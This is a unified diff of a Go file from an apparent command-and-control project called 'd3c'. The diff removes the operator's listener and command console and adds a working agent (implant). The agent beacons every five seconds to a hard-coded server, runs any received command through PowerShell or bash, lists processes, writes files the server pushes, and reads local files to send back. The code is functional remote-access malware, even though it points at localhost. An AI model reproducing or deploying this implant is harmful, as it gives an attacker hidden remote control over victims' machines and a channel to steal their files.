@@ -1,217 +1,198 @@
 package main
 
 import (
-	"bufio"
+	"crypto/md5"
 	"d3c/commons/estruturas"
 	"d3c/commons/helpers"
 	"encoding/gob"
+	"encoding/hex"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"net"
 	"os"
-	"strings"
+	"os/exec"
+	"os/user"
+	"runtime"
+	"time"
+
+	"github.com/mitchellh/go-ps"
+)
+
+const (
+	SERVIDOR = "127.0.0.1"
+	PORTA    = "9090"
 )
 
 var (
-	agentesEmCampo    = []estruturas.Mensagem{}
-	agenteSelecionado = ""
+	mensagem    estruturas.Mensagem
+	tempoEspera = 5
 )
 
+func init() {
+	mensagem.AgentHostname, _ = os.Hostname()
+	mensagem.AgentCWD, _ = os.Getwd()
+	mensagem.AgentID = geraID()
+}
+
 func main() {
-	log.Println("Entrei em execução")
+	log.Println("Entrei em Execução...")
 
-	go startListener("9090")
-
-	cliHandler()
-}
-
-func cliHandler() {
 	for {
-		if agenteSelecionado != "" {
-			print(agenteSelecionado + "@D3C# ")
+		canal := conectaServidor()
+		defer canal.Close()
 
-		} else {
-			print("D3C> ")
-		}
+		// Enviando a mensagem para o servidor
+		gob.NewEncoder(canal).Encode(mensagem)
+		mensagem.Comandos = []estruturas.Commando{}
+		// Recebendo a mensagem do servidor
+		gob.NewDecoder(canal).Decode(&mensagem)
 
-		//
-		reader := bufio.NewReader(os.Stdin)
-		comandoCompleto, _ := reader.ReadString('\n')
-
-		comandoSeparado := helpers.SeparaComando(comandoCompleto)
-		comandoBase := strings.TrimSpace(comandoSeparado[0])
-
-		if len(comandoBase) > 0 {
-			switch comandoBase {
-			case "show":
-				showHandler(comandoSeparado)
-			case "select":
-				selectHandler(comandoSeparado)
-			case "send":
-				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
-					var erro error
-					arquivoParaEnviar := &estruturas.Arquivo{}
-
-					arquivoParaEnviar.Nome = comandoSeparado[1]
-					arquivoParaEnviar.Conteudo, erro = os.ReadFile(arquivoParaEnviar.Nome)
-
-					comandoSend := &estruturas.Commando{}
-					comandoSend.Comando = comandoSeparado[0]
-					comandoSend.Arquivo = *arquivoParaEnviar
-
-					if erro != nil {
-						log.Println("Erro ao abrir o arquivo: ", erro.Error())
-					} else {
-						agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
-					}
-
-				} else {
-					log.Println("Especifique o arquivo a ser enviado.")
-				}
-
-			case "get":
-				if len(comandoSeparado) > 1 && agenteSelecionado != "" {
-					comandoSend := &estruturas.Commando{}
-					comandoSend.Comando = comandoCompleto
-
-					agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos = append(agentesEmCampo[posicaoAgenteEmCampo(agenteSelecionado)].Comandos, *comandoSend)
-
-				} else {
-					log.Println("Especifique o arquivo que deseja copiar.")
-				}
-			default:
-				if agenteSelecionado != "" {
-					comando := &estruturas.Commando{}
-					comando.Comando = comandoCompleto
-
-					for indice, agente := range agentesEmCampo {
-						if agente.AgentID == agenteSelecionado {
-							// Adicionar na mensagem desse agente o comando recebido pela CLI
-							agentesEmCampo[indice].Comandos = append(agentesEmCampo[indice].Comandos, *comando)
-						}
-					}
-				} else {
-					log.Println("O comando digitado não existe!")
-				}
+		if mensagemContemComandos(mensagem) {
+			for indice, comando := range mensagem.Comandos {
+				mensagem.Comandos[indice].Resposta = executaComando(comando.Comando, indice)
 			}
 		}
 
+		time.Sleep(time.Duration(tempoEspera) * time.Second)
 	}
-
 }
 
-func showHandler(comando []string) {
-	if len(comando) > 1 {
-		switch comando[1] {
-		case "agentes":
-			for _, agente := range agentesEmCampo {
-				println("Agente ID: " + agente.AgentID + "->" + agente.AgentHostname + "@" + agente.AgentCWD)
-			}
-		default:
-			log.Println("O parametro selecionado nao existe.")
+func executaComando(comando string, indice int) (resposta string) {
+	comandoSeparado := helpers.SeparaComando(comando)
+	comandoBase := comandoSeparado[0]
+
+	switch comandoBase {
+	case "ls":
+		resposta = listaArquivos()
+	case "pwd":
+		resposta = listaDiretorioAtual()
+	case "cd":
+		if len(comandoSeparado[1]) > 0 {
+			resposta = mudarDeDiretorio(comandoSeparado[1])
 		}
+	case "whoami":
+		resposta = quemSouEu()
+	case "ps":
+		resposta = listaProcessos()
+	case "send":
+		resposta = salvaArquivoEmDisco(mensagem.Comandos[indice].Arquivo)
+	case "get":
+		resposta = enviarArquivo(mensagem.Comandos[indice].Comando, indice)
+	default:
+		resposta = executaComandoEmShell(comando)
 	}
 
+	return resposta
 }
 
-func selectHandler(comando []string) {
-	if len(comando) > 1 {
-		if agenteCadastrado(comando[1]) {
-			agenteSelecionado = comando[1]
-		} else {
-			log.Println("O Agente selecionado não está em campo.")
-			log.Println("Para listar os Agentes em campo use: show agentes")
-		}
+func enviarArquivo(comandoGet string, indice int) (resposta string) {
+	var err error
+	resposta = "Arquivo enviado com sucesso."
+	comandoSeparado := helpers.SeparaComando(comandoGet)
 
+	mensagem.Comandos[indice].Arquivo.Conteudo, err = ioutil.ReadFile(comandoSeparado[1])
+	if err != nil {
+		resposta = "Erro ao copiar o arquivo: " + err.Error()
+		mensagem.Comandos[indice].Arquivo.Erro = true
+	}
+	mensagem.Comandos[indice].Arquivo.Nome = comandoSeparado[1]
+
+	return resposta
+}
+
+func salvaArquivoEmDisco(arquivo estruturas.Arquivo) (resposta string) {
+	resposta = "Arquivo enviado com sucesso!"
+
+	err := os.WriteFile(arquivo.Nome, arquivo.Conteudo, 0644)
+
+	if err != nil {
+		resposta = "Erro ao salvar arquivo no destino: " + err.Error()
+	}
+
+	return resposta
+}
+
+func executaComandoEmShell(comandoCompleto string) (resposta string) {
+	if (runtime.GOOS) == "windows" {
+		output, _ := exec.Command("powershell.exe", "/C", comandoCompleto).CombinedOutput()
+		resposta = string(output)
 	} else {
-		agenteSelecionado = ""
-
-	}
-}
-
-func agenteCadastrado(agentID string) (cadastrado bool) {
-	cadastrado = false
-
-	for _, agente := range agentesEmCampo {
-		if agente.AgentID == agentID {
-			cadastrado = true
+		if (runtime.GOOS) == "linux" {
+			output, _ := exec.Command("/bin/bash", "-c", comandoCompleto).CombinedOutput()
+			resposta = string(output)
 		}
+		// Linha nula
 	}
+	return resposta
 
-	return cadastrado
 }
 
-func mensagemContemResposta(mensagem estruturas.Mensagem) (contem bool) {
+func listaProcessos() (processos string) {
+	listaDeProcessos, _ := ps.Processes()
+
+	for _, processo := range listaDeProcessos {
+		processos += fmt.Sprintf("%d -> %d -> %s \n", processo.PPid(), processo.Pid(), processo.Executable())
+	}
+
+	return processos
+}
+
+func quemSouEu() (meuNome string) {
+	usuario, _ := user.Current()
+	meuNome = usuario.Username
+	return meuNome
+
+}
+
+func mudarDeDiretorio(novoDiretorio string) (resposta string) {
+	resposta = "Diretorio corrente alterado com sucesso"
+	err := os.Chdir(novoDiretorio)
+
+	if err != nil {
+		resposta = "O diretorio" + novoDiretorio + " não existe."
+	}
+
+	return resposta
+}
+
+func listaDiretorioAtual() (diretorioAtual string) {
+	diretorioAtual, _ = os.Getwd()
+	return diretorioAtual
+}
+
+func listaArquivos() (resposta string) {
+	arquivos, _ := ioutil.ReadDir(listaDiretorioAtual())
+
+	for _, arquivo := range arquivos {
+		resposta += arquivo.Name() + "\n"
+	}
+
+	return resposta
+}
+
+func mensagemContemComandos(mensagemDoServidor estruturas.Mensagem) (contem bool) {
 	contem = false
 
-	for _, comando := range mensagem.Comandos {
-		if len(comando.Resposta) > 0 {
-			contem = true
-		}
+	if len(mensagemDoServidor.Comandos) > 0 {
+		contem = true
 	}
 
 	return contem
+
 }
 
-func posicaoAgenteEmCampo(agenteId string) (posicao int) {
-	for indice, agente := range agentesEmCampo {
-		if agenteId == agente.AgentID {
-			posicao = indice
-		}
-	}
-	return posicao
+func conectaServidor() (canal net.Conn) {
+	canal, _ = net.Dial("tcp", SERVIDOR+":"+PORTA)
+	return canal
 }
 
-func salvarArquivo(arquivo estruturas.Arquivo) {
-	err := ioutil.WriteFile(arquivo.Nome, arquivo.Conteudo, 644)
+func geraID() string {
+	myTime := time.Now().String()
 
-	if err != nil {
-		log.Println("Erro ao salvar o arquivo recebido: ", err.Error())
-	}
-}
+	hasher := md5.New()
+	hasher.Write([]byte(mensagem.AgentHostname + myTime))
 
-func startListener(port string) {
-	listerner, err := net.Listen("tcp", "0.0.0.0:"+port)
+	return hex.EncodeToString(hasher.Sum(nil))
 
-	if err != nil {
-		log.Fatal("Erro ao iniciar o Listerner: ", err.Error())
-	} else {
-		for {
-			canal, err := listerner.Accept()
-			defer canal.Close()
-
-			if err != nil {
-				log.Println("Erro em um novo canal: ", err.Error())
-			} else {
-				mensagem := &estruturas.Mensagem{}
-
-				gob.NewDecoder(canal).Decode(mensagem)
-
-				// Verificar se o Agente já foi apresentado anteriormente
-				if agenteCadastrado(mensagem.AgentID) {
-					if mensagemContemResposta(*mensagem) {
-						log.Println("Resposta do Host: ", mensagem.AgentHostname)
-						// Exibir as respostas
-						for indice, comando := range mensagem.Comandos {
-							log.Println("Resposta do Comando: ", comando.Comando)
-							println(comando.Resposta)
-							if helpers.SeparaComando(comando.Comando)[0] == "get" &&
-								mensagem.Comandos[indice].Arquivo.Erro == false {
-								salvarArquivo(mensagem.Comandos[indice].Arquivo)
-							}
-						}
-					}
-					// Enviar a lista de comandos enfileirados para o agente
-					gob.NewEncoder(canal).Encode(agentesEmCampo[posicaoAgenteEmCampo(mensagem.AgentID)])
-					// Zerar a lista de comandos do agente
-					agentesEmCampo[posicaoAgenteEmCampo(mensagem.AgentID)].Comandos = []estruturas.Commando{}
-				} else {
-					log.Println("Nova conexão: ", canal.RemoteAddr().String())
-					log.Println("Agente ID: ", mensagem.AgentID)
-					agentesEmCampo = append(agentesEmCampo, *mensagem)
-					gob.NewEncoder(canal).Encode(mensagem)
-				}
-			}
-		}
-	}
 }
